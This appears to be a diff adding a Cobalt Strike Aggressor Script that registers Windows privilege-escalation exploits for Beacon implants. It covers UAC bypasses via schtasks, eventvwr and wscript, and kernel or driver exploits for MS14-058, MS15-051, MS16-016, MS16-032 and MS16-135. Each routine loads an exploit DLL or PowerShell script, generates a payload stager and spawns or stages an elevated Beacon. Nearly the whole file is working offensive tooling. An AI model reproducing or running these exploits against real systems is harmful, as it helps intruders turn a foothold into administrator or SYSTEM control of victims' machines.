@@ -1,0 +1,222 @@
+#
+# Integrate several privilege escalation exploits into Cobalt Strike via Aggressor Script
+# 
+# $module_path = 'modules/ElevateKit/';
+
+# Integrate schtasks.exe (via SilentCleanup) Bypass UAC attack
+# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
+sub schtasks_elevator {
+    local('$handle $script $oneliner $command');
+
+    # acknowledge this command
+    btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");
+
+    # read in the script
+    $handle = openf(script_resource("modules/ElevateKit/Invoke-EnvBypass.ps1"));
+    $script = readb($handle, -1);
+    closef($handle);
+
+    # host the script in Beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    # base64 encode the command
+    $command  = transform($2, "powershell-base64");
+
+    # run the specified command via this exploit.
+    bpowerpick!($1, "Invoke-EnvBypass -Command \" $+ $command $+ \"", $oneliner);
+}
+
+beacon_exploit_register("uac-schtasks", "Bypass UAC with schtasks.exe (via SilentCleanup)", &schtasks_elevator);
+
+# Integrate Matt Nelson's file-less eventvwr.exe Bypass UAC attack
+# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
+sub eventvwr_elevator {
+    local('$handle $script $oneliner');
+
+    # acknowledge this command
+    btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");
+
+    # read in the script
+    $handle = openf(getFileProper(script_resource("modules/ElevateKit/Invoke-EventVwrBypass.ps1"));
+    $script = readb($handle, -1);
+    closef($handle);
+
+    # host the script in Beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    # run the specified command via this exploit.
+    bpowerpick!($1, "Invoke-EventVwrBypass -Command \" $+ $2 $+ \"", $oneliner);
+}
+
+beacon_exploit_register("uac-eventvwr", "Bypass UAC with eventvwr.exe", &eventvwr_elevator);
+
+# Integrate wscript.exe Bypass UAC attack
+# Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
+sub wscript_elevator {
+    local('$handle $script $oneliner');
+
+    # acknowledge this command
+    btask($1, "Tasked Beacon to execute $2 in a high integrity context", "T1088");
+
+    # read in the script
+    $handle = openf(getFileProper(script_resource("modules/ElevateKit/Invoke-WScriptBypassUAC.ps1"));
+    $script = readb($handle, -1);
+    closef($handle);
+
+    # host the script in Beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    # run the specified command via this exploit.
+    bpowerpick!($1, "Invoke-WScriptBypassUAC -payload \" $+ $2 $+ \"", $oneliner);
+}
+
+beacon_exploit_register("uac-wscript", "Bypass UAC with wscript.exe", &wscript_elevator);
+
+# Integrate windows/local/ms14_058_track_popup_menu from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms14_058_track_popup_menu.rb
+sub ms14_058_exploit {
+    local('$stager $arch $dll');
+    # acknowledge this command
+    btask($1, "Task Beacon to run " . listener_describe($2) . " via ms14-058", "T1068");
+
+    # tune our parameters based on the target arch
+    if (-is64 $1) {
+        $arch   = "x64";
+        # $dll    = getFileProper(script_resource("$module_path"), "cve-2014-4113.x64.dll");
+        $dll = script_resource("modules/ElevateKit/cve-2014-4113.x64.dll");
+    }
+    else {
+        $arch   = "x86";
+        # $dll    = getFileProper(script_resource("$module_path"), "cve-2014-4113.x86.dll");
+        $dll = script_resource("modules/ElevateKit/cve-2014-4113.x86.dll");
+    }
+
+    # generate our shellcode
+    $stager = payload($2, $arch);
+
+    # spawn a Beacon post-ex job with the exploit DLL
+    bdllspawn!($1, $dll, $stager, "ms14-058", 5000);
+
+    # link to our payload if it's a TCP or SMB Beacon
+    beacon_link($1, $null, $2);
+}
+
+beacon_exploit_register("ms14-058", "TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)", &ms14_058_exploit);
+
+# Integrate windows/local/ms15_051_client_copy_image from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
+sub ms15_051_exploit {
+    local('$stager $arch $dll');
+
+    # acknowledge this command
+    btask($1, "Task Beacon to run " . listener_describe($2) . " via ms15-051", "T1068");
+
+    # tune our parameters based on the target arch
+    if (-is64 $1) {
+        $arch   = "x64";
+        # $dll    = getFileProper(script_resource("$module_path"), "cve-2015-1701.x64.dll");
+        $dll = script_resource("modules/ElevateKit/cve-2015-1701.x64.dll");
+    }
+    else {
+        $arch   = "x86";
+        # $dll    = getFileProper(script_resource("$module_path"), "cve-2015-1701.x86.dll");
+        $dll = script_resource("modules/ElevateKit/cve-2015-1701.x86.dll");
+    }
+
+    # generate our shellcode
+    $stager = payload($2, $arch);
+
+    # spawn a Beacon post-ex job with the exploit DLL
+    bdllspawn!($1, $dll, $stager, "ms15-051", 5000);
+
+    # link to our payload if it's a TCP or SMB Beacon
+    beacon_link($1, $null, $2);
+}
+
+beacon_exploit_register("ms15-051", "Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)", &ms15_051_exploit);
+
+# Integrate windows/local/ms16_016_webdav from Metasploit
+# https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_016_webdav.rb
+sub ms16_016_exploit {
+    local('$stager');
+
+    # check if we're on an x64 system and error out.
+    if (-is64 $1) {
+        berror($1, "ms16-016 exploit is x86 only");
+        return;
+    }
+
+    # acknowledge this command
+    btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016", "T1068");
+
+    # generate our shellcode
+    $stager = payload($2, "x86");
+
+    # spawn a Beacon post-ex job with the exploit DLL
+    # bdllspawn!($1, getFileProper(script_resource("$module_path"), "cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+    bdllspawn!($1, script_resource("modules/ElevateKit/cve-2016-0051.x86.dll"), $stager, "ms16-016", 5000);
+    
+
+    # link to our payload if it's a TCP or SMB Beacon
+    beacon_link($1, $null, $2);
+}
+
+beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)", &ms16_016_exploit);
+
+
+# ms16-032 exploit
+sub ms16_032_exploit {
+    local('$script $oneliner');
+
+    # acknowledge this command
+    btask($1, "Tasked Beacon to run " . listener_describe($2) . " via ms16-032", "T1068");
+
+    # generate a PowerShell script to run our Beacon listener
+    $script = artifact($2, "powershell");
+
+    # host this script within this Beacon
+    $oneliner = beacon_host_script($1, $script);
+
+    $source = script_resource("modules/ElevateKit/Invoke-MS16032.ps1");
+    # Import & run
+    bpowershell_import!($1, $source);
+    # task Beacon to run this exploit with our one-liner that runs Beacon
+    # bpowershell_import!($1, getFileProper(script_resource("$module_path"), "Invoke-MS16032.ps1"));
+    bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $oneliner $+ \"");
+
+    # give it another 10s to work.
+    bpause($1, 10000);
+
+    # handle staging
+    bstage($1, $null, $2);
+}
+
+beacon_exploit_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_exploit); 
+
+
+## Integrate ms16-135
+sub ms16_135 {
+    local('$script $oneliner');
+    btask($1, "Tasked Beacon to run " . listener_describe($2) . " via MS16-135");
+
+    # Generate PowerShell
+    $script = artifact($2, "powershell");
+
+    # Host script
+    $oneliner = beacon_host_script($1, $script);
+
+    # Source
+    # $source = getFileProper(script_resource("$module_path"), "Invoke-MS16135.ps1");
+    $source = script_resource("modules/ElevateKit/Invoke-MS16135.ps1");
+    # Import & run
+    bpowershell_import!($1, $source);
+    bpowerpick!($1, "Invoke-MS16135 -Command \" $+ $oneliner $+ \"");
+
+    # Wait
+    bpause($1, 10000);
+
+    # Stage
+    bstage($1, $null, $2);
+}
+
+beacon_exploit_register("ms16-135", "Win32k Elevation of Privilege (CVE-2016-7255)", &ms16_135);
